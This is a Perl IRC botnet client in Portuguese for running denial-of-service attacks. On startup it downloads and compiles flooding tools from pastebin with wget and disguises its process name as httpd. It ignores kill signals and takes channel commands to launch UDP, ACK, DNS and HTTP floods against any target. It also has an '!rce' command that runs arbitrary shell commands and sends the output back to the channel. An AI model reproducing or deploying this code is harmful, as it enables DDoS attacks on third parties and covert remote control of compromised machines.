#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "127.0.0.1"; 
my $code = int(rand(100000));
my $channel = "#channel";
my $port    =   "6667";
my $nick    = "Machine_$code";

unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget https://pastebin.com/raw/XiwqFZqe -O sadattack.py");
}

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://pastebin.com/raw/gdDMQXWQ -O hulk.py");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://pastebin.com/raw/eY3C0anh -O goldeneye.py");
}

unless (-e "udp1.pl") { 
  print "[*] Instalando UDPFlooder... ";
  system("wget https://pastebin.com/raw/n399Y8ES -O udp1.pl");
}

unless (-e "std.c") { 
  print "[*] Instalando STD... ";
  system("wget https://pastebin.com/raw/3UCGvEnD -O std.c");
  system("gcc std.c -o std -pthread");
}

unless (-e "httpabuse.pl") { 
  print "[*] Instalando HTTPABUSE... ";
  system("wget https://pastebin.com/raw/nzmmmQaR -O httpabuse.pl");
}

unless (-e "rand.pl") { 
  print "[*] Instalando UDPRand... ";
  system("wget https://pastebin.com/raw/XqHSJT1J -O rand.pl");
}

unless (-e "DNS.pl") { 
  print "[*] Instalando DNS... ";
  system("wget https://pastebin.com/raw/ZEeaYZRg -O DNS.pl");
}

unless (-e "ack.pl") { 
  print "[*] Instalando ACK... ";
  system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl");
}
all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

     if ( $log =~ m/:!sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :67[63SADATTACK67]61 Attack started at $1, use !stopsad for stop :P \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopsad/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63SADATTACK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f sadattack");
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack started at $1, use !stophulk for stop :P \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HULK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :67[63GOLD67]61 Attack started at $1, use !stopgold for stop :P \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopgold/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63GOLD67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack started at $target_udp, use !stopudp for stop :P \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f udp1");
      }

      if ( $log =~ m/:!std (.*)$/g ){##########
        my $target_std = $1;
        my $port_std = $2;
        my $time_std = $3;
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Attack started at $target_std, use !stopstd for stop :P \r\n";
        system("nohup ./std $target_std $port_std $time_std > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopstd/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63STD67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f std");
      }

    if ( $log =~ m/:!httpabuse (.*)$/g ){##########
        my $target_httpabuse = $1;
        $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpabuse;
        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
        system("nohup perl httpabuse.pl $target_httpabuse 1000 100 GET 13.37 > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopabuse/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f httpabuse");
      }

      if ( $log =~ m/:!dns (.*)$/g ){##########
        my $target_dns = $1;
        my $time_dns = $2;
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 Attack started at $target_dns, use !stopdns for stop :P \r\n";
        system("nohup perl DNS.pl $target_dns $time_dns > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopdns/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63DNS67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f DNS");
      }
	  
    if ( $log =~ m/:!rand (.*)$/g ){##########
        my $target_rand = $1;
        my $time_rand = $2;
        print $s0ck3t "PRIVMSG $channel :67[63RAND67]61 Attack started at $target_rand, use !stoprand for stop :P \r\n";
        system("nohup perl rand.pl $target_rand $time_rand > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stoprand/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63RAND67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f rand");
      }

    if ( $log =~ m/:!ack (.*)$/g ){##########
        my $target_ack = $1;
        my $time_ack = $2;
        print $s0ck3t "PRIVMSG $channel :67[63ACK67]61 Attack started at $target_ack, use !stopack for stop :P \r\n";
        system("nohup perl ack.pl $target_ack $time_ack > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopack/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63ACK67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f ack");
      }
	 
   if ( $log =~ m/:!ufo (.*)$/g ){##########
        my $target_ufo = $1;
        my $time_ufo = $2;
        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack started at $target_ufo, use !stopufo for stop :P \r\n";
        system("nohup perl ufo.pl $target_ufo $time_ufo > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopufo/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack sucessfully finished! \r\n";
        system("pkill -9 -f ack");
      }
	  
     if ( $log =~ m/:!help/g ){##########
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Métodos de ataque layer 4:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !udp ip / !stopudp\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !std ip port time / !stopstd\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !rand ip time / !stoprand\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !dns ip time / !stopdns\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !ack ip time / !stopack\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !ufo ip time / !stopack\r\n";
        print $s0ck3t "PRIVMSG $channel :67\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Métodos de ataque layer 7:\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !sadattack http://wwww.google.com/ / !stopsad\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !hulk http://www.google.com/ / !stophulk\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !gold http://www.google.com.br / !stopgold\r\n";
        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !httpabuse http://www.google.com / !stopabuse\r\n";
      }
	  
   if ( $log =~ m/:!info/g ){##########
        print $s0ck3t "PRIVMSG $channel :twitter.com/1nocent\r\n";
      }

      #######################
      # Inocent @ Pryzraky  #
      #######################

      #######################
      # Inocent @ Pryzraky  #
      #######################
      
      #######################
      # Inocent @ Pryzraky  #
      #######################
      
      #######################
      # Inocent @ Pryzraky  #
      #######################
      
      #######################
      # Inocent @ Pryzraky  #
      #######################
      
      if ( $log =~ m/:!rce (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);
	
        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :67[63RCE67]61 Output67 => $comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
